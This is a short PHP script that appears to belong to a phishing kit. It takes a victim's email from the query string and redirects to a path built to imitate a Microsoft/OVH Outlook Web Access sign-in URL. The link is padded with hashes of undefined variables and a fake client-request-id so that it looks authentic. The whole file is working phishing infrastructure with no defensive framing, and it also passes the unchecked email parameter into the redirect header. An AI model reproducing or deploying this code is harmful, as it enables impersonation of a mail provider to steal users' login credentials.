<?php
ob_start();

function now() {
date_default_timezone_set('GMT');
return date("h:i:sa");
}
$url = md5($url);
$praga= password_hash($praga, PASSWORD_BCRYPT, array('cost' => 12));


if(isset($_GET['email'])){
    
$email = $_GET['email'];

}

header("Location: wa=wsignin1.0&wtrealm=https-3a2f-2fex3.mail.ovh.net-2fowa=2f&wctx=rm-3d026id-3dpassive-26ru-3d252fowa-252f253fauthRedirect-253dtrue.php?contextid&microsoft=$praga&randsalt=$url&email=$email&authentication=$praga&client-request-id=d3ffb5da-8321-4513-1df6-0180010000c7");

?>